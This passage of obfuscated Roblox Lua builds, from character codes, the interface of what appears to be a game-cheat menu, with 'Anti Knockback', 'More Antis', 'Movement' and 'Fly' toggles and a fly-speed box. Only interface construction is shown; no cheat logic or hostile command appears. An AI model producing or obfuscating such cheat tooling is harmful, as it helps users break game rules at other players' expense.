_llza[_sc(49,54,57)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,54,55)]);
_llza[_sc(49,54,57)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,54,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,54,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,54,57)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,54,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,54,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,54,97)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,54,57)]);
_llza[_sc(49,54,97)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,54,97)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,54,98)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,54,52)]);
_llza[_sc(49,54,98)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,54,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,54,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,54,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,54,98)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,54,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,54,98)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,54,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,54,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,54,98)][_sc(84,101,120,116)]=[[Anti Knockback]];
_llza[_sc(49,54,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,54,98)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,54,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,54,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,54,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,54,98)]);
_llza[_sc(49,54,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,54,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,54,98)]);
_llza[_sc(49,54,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,54,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,54,52)]);
_llza[_sc(49,54,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,54,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,54,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(49,54,102)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(49,54,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,54,102)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(49,54,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,54,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,54,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,54,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55,48)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,54,102)]);
_llza[_sc(49,55,48)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,55,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,55,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,55,48)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,55,48)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(49,55,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,55,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(49,55,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,55,48)][_sc(84,101,120,116)]=[[Anti]];
_llza[_sc(49,55,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,55,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,55,48)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(49,55,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,55,48)]);
_llza[_sc(49,55,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,55,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,55,48)]);
_llza[_sc(49,55,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(49,55,51)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,54,102)]);
_llza[_sc(49,55,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,55,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,55,51)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(49,55,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,55,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55,51)][_sc(83,105,122,101)]=UDim2.new(0, 35, 1, 0);
_llza[_sc(49,55,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,55,51)][_sc(84,101,120,116)]=[[-]];
_llza[_sc(49,55,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,55,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -30, 0, 0);
_llza[_sc(49,55,51)][_sc(78,97,109,101)]=[[minimise]];
_llza[_sc(49,55,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,55,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,55,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(49,55,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,55,52)][_sc(78,97,109,101)]=[[LABEL]];
_llza[_sc(49,55,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,55,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,55,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(49,55,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55,53)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,55,52)]);
_llza[_sc(49,55,53)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,55,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,55,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,55,53)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,55,53)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(49,55,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,55,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,55,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,55,53)][_sc(84,101,120,116)]=[[More Antis]];
_llza[_sc(49,55,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,55,53)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,55,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,55,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,55,53)]);
_llza[_sc(49,55,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(49,55,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,55,53)]);
_llza[_sc(49,55,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,55,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,49)]);
_llza[_sc(49,55,56)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 151);
_llza[_sc(49,55,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,55,56)][_sc(78,97,109,101)]=[[movementTab]];
_llza[_sc(49,55,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,55,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(49,55,57)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(49,55,56)]);
_llza[_sc(49,55,57)][_sc(78,97,109,101)]=_sc(109,111,118,101,109,101,110,116,83,99,114,105,112,116);
_llza[_sc(49,55,97)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(49,55,56)]);
_llza[_sc(49,55,97)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(49,55,97)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(49,55,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,55,98)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,55,98)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(49,55,98)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,55,98)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(49,55,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,55,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(49,55,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,55,99)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(49,55,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,55,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,55,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,55,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,99)]);
_llza[_sc(49,55,100)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(49,55,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,55,100)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(49,55,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,55,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(49,55,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,55,101)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(49,55,100)]);
_llza[_sc(49,55,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,55,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(49,55,102)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(49,55,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,55,102)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(49,55,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,55,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,55,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,55,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,48)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,55,102)]);
_llza[_sc(49,56,48)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,56,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,56,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,56,48)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,56,48)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(49,56,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,56,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(49,56,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,56,48)][_sc(84,101,120,116)]=[[Movement]];
_llza[_sc(49,56,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,56,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,56,48)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(49,56,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,56,48)]);
_llza[_sc(49,56,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,56,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,56,48)]);
_llza[_sc(49,56,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(49,56,51)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,55,102)]);
_llza[_sc(49,56,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,56,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,56,51)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(49,56,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,56,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,51)][_sc(83,105,122,101)]=UDim2.new(0, 35, 1, 0);
_llza[_sc(49,56,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,56,51)][_sc(84,101,120,116)]=[[-]];
_llza[_sc(49,56,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,56,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -30, 0, 0);
_llza[_sc(49,56,51)][_sc(78,97,109,101)]=[[minimise]];
_llza[_sc(49,56,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,56,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,56,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,56,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,56,52)][_sc(78,97,109,101)]=[[Fly]];
_llza[_sc(49,56,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,56,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,56,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,56,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,53)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,56,52)]);
_llza[_sc(49,56,53)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,56,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,56,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,56,53)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,56,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,56,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,56,53)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,56,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,56,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,56,53)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,56,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,56,53)]);
_llza[_sc(49,56,54)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,56,54)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,56,54)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,56,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,56,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,56,53)]);
_llza[_sc(49,56,55)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,56,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,56,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,56,55)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,56,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,56,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,56,55)]);
_llza[_sc(49,56,56)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,56,56)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,56,57)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,56,55)]);
_llza[_sc(49,56,57)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,56,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,56,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,56,57)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,56,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,56,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,97)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,56,57)]);
_llza[_sc(49,56,97)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,56,97)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,56,98)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,56,52)]);
_llza[_sc(49,56,98)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,56,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,56,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,56,98)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,56,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,56,98)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(49,56,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,56,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,56,98)][_sc(84,101,120,116)]=[[Fly]];
_llza[_sc(49,56,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,56,98)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,56,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,56,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,56,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,56,98)]);
_llza[_sc(49,56,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,56,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,56,98)]);
_llza[_sc(49,56,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,56,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,56,52)]);
_llza[_sc(49,56,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,56,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,56,52)]);
_llza[_sc(49,56,102)][_sc(90,73,110,100,101,120)]=55;
_llza[_sc(49,56,102)][_sc(83,105,122,101)]=UDim2.new(0, 70, 0, 20);
_llza[_sc(49,56,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,56,102)][_sc(78,97,109,101)]=[[FlyChanger]];
_llza[_sc(49,56,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,56,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,56,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -70, 0, 0);
_llza[_sc(49,56,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,57,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,56,102)]);
_llza[_sc(49,57,48)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(49,57,48)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(49,57,48)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,57,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,57,49)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(49,56,102)]);
_llza[_sc(49,57,49)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,57,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,57,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,57,49)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,57,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,57,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,57,49)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[(50)]];
_llza[_sc(49,57,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,57,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,57,49)][_sc(84,101,120,116)]=[[]];
_llza[_sc(49,57,49)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(49,57,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,57,49)]);
